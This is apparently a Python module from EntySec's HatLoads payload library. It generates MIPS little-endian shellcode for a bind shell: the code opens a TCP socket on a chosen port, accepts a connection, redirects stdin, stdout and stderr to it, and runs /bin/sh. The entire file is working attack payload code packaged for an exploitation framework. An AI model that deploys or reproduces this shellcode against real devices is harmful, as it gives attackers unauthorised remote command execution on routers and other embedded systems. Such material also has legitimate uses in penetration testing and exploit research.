#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatasm import HatAsm
from hatvenom import HatVenom

from hatloads.words import Words


class ShellBindTCP(HatAsm, HatVenom, Words):
    def generate(self, assemble=True, options={}):
        if 'BPORT' not in options:
            return b''

        if 'SHELL' in options:
            shell = options['SHELL'].encode()
        else:
            shell = self.shell['sh'].encode()

        shell = shell[::-1]
        bport = self.convert_port(options['BPORT'])

        shellcode = f"""
        start:
            addiu $sp, $sp, -0x20
            addiu $t6, $zero, -3
            not $a0, $t6
            not $a1, $t6
            slti $a2, $zero, -1
            addiu $v0, $zero, 0x1057
            syscall 0x40404

            andi $s0, $v0, 0xffff
            addiu $t6, $zero, -0x11
            not $t6, $t6
            addiu $t5, $zero, -3
            not $t5, $t5
            sllv $t5, $t5, $t6
            addiu $t6, $zero, 0x{bport.hex()}
            or $t5, $t5, $t6
            sw $t5, -0x20($sp)
            sw $zero, -0x1c($sp)
            sw $zero, -0x18($sp)
            sw $zero, -0x14($sp)
            or $a0, $s0, $s0
            addiu $t6, $zero, -0x11
            not $a2, $t6
            addi $a1, $sp, -0x20
            addiu $v0, $zero, 0x1049
            syscall 0x40404

            or $a0, $s0, $s0
            addiu $a1, $zero, 0x101
            addiu $v0, $zero, 0x104e
            syscall 0x40404

            or $a0, $s0, $s0
            slti $a1, $zero, -1
            slti $a2, $zero, -1
            addiu $v0, $zero, 0x1048
            syscall 0x40404

            sw $v0, -1($sp)
            addiu $s1, $zero, -3
            not $s1, $s1
            lw $a0, -1($sp)

        dup:
            move $a1, $s1
            addiu $v0, $zero, 0xfdf
            syscall 0x40404

            addiu $s0, $zero, -1
            addi $s1, $s1, -1
            bne $s1, $s0, dup

            slti $a2, $zero, -1
            lui $t7, 0x6962
            ori $t7, $t7, 0x2f2f
            sw $t7, -0x14($sp)
            lui $t6, 0x6873
            ori $t6, $t6, 0x2f6e
            sw $t6, -0x10($sp)
            sw $zero, -0xc($sp)
            addiu $a0, $sp, -0x14
            sw $a0, -8($sp)
            sw $zero, -4($sp)
            addiu $a1, $sp, -8
            addiu $v0, $zero, 0xfab
            syscall 0x40404
        """

        if assemble:
            return self.assemble('mipsle', shellcode)
        return shellcode
